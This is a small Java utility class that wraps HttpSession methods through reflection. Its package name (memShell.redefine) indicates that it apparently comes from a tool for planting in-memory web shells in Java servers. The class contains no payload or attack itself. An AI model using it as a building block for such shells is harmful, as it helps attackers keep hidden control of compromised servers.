package org.memShell.redefine;

public class MySession {
	public static void setAttribute(Object httpSession, String arg1, Object arg2) throws Exception {
		httpSession.getClass().getMethod("setAttribute", String.class, Object.class).invoke(httpSession, arg1, arg2);
	}

	public static Object getAttribute(Object httpSession, String arg1) throws Exception {
		return httpSession.getClass().getMethod("getAttribute", String.class).invoke(httpSession, arg1);
	}

	public static void invalidate(Object httpSession) throws Exception {
		httpSession.getClass().getMethod("invalidate", null).invoke(httpSession, new Object[] {});
	}
	
	public static void removeAttribute(Object httpSession, String arg1) throws Exception {
		httpSession.getClass().getMethod("removeAttribute", String.class).invoke(httpSession, arg1);
	}
	
	public static void putValue(Object httpSession, String arg1, Object arg2) throws Exception {
		httpSession.getClass().getMethod("putValue", String.class, Object.class).invoke(httpSession, arg1, arg2);
	}
}
